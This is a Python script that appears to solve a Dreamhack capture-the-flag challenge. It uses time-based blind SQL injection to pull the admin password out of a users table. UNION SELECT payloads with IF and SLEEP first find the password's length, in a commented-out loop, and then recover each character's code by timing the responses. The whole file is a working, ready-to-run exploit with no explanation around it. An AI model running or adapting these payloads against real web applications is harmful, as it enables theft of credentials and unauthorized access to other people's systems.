import urllib.request
import requests
import time

url = "http://host3.dreamhack.games:15096/"
pw = ""

# for i in range(0, 100):
#     start = time.time()
#     print(i)
#     param = {
#         "uid": "'union select if(length(upw)={},sleep(3),1) ,null,null from users where uid='admin';--".format(
#             i
#         )
#     }
#     re = requests.get(url, params=param)
#     if time.time() - start > 2:
#         pw_length = i
#         break
# print("Password length is ", pw_length)

pw_length = 27

for i in range(1, pw_length + 1):
    for j in range(0, 12300):
        start = time.time()

        param = {
            "uid": "'union select if(ascii(substring(upw,{},1))={},sleep(0.1),1) ,null,null from users where uid='admin';--".format(
                i, j
            )
        }

        re = requests.get(url, params=param)
        if time.time() - start > 0.2:
            pw += str(j) + " "
            print("Password is ", pw)
            break
